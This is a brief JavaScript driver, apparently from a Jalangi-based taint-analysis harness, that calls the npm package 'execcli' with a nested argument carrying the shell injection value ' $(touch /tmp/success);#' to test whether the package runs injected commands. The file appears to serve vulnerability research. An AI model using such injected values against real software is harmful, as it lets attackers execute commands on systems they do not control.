// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/execcli/node_modules/execcli');
try {
	var x0 = ".";
var x1 = "~/";
var x2 = {"2":{"_val":{"1":{"_val":{"2":{"2":" $(touch /tmp/success);#"}}}}}};
PUT["execcli"](x0,x1,x2)();
} catch (e) {
	console.log(e);
}